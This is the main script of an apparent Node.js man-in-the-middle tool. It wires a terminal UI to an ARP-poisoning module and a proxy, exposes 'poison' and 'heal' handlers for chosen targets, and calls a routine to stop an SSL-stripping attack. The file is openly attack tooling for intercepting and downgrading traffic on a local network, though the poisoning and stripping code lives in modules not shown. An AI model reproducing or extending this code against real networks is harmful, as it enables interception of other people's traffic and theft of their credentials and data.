        var http = require('http'),
         connect = require('connect'),
       httpProxy = require('http-proxy'),
              ui = require('./lib/verth_ui'),
             arp = require('./lib/poision'),
          logger = require('./lib/verthLogger'),
           proxy = require('./lib/verthProxy'),
transformerProxy = require('transformer-proxy');

arp.setInterface('en1')
ui.init()
logger.mount(ui)
proxy.init()

proxy.on('output', function (data) {
  ui.toWidget(data.target, data.message)
})

logger.on('output', function (data) {
  ui.toWidget(data.target, data.message)
})

ui.on('poision', function (target, self) {
  arp.poison(target, self);
});

ui.on('heal', function (target, gateway) {
  arp.heal(target, gateway);
  proxy.stopSSLStripAttack()
})
